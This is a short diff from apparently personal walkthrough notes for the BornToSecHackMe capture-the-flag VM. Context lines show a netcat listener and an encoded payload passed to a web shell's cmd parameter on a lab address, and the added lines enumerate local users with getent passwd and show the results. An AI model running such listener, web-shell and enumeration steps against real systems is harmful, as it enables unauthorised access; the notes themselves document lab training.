@@ -60,3 +60,17 @@ open a port and start listening for incoming connection
 nc -lk -p 3412
 
 encode the pyload and pass it to cmd in : https://10.12.100.143/?cmd=(encoded pyload)
+
+
+
+## list users 
+laurie@borntosec.net@BornToSecHackMe:~$ getent passwd {1000..60000}
+getent passwd {1000..60000}
+ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
+lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
+laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
+laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
+thor:x:1004:1004:,,,:/home/thor:/bin/bash
+zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
+
+
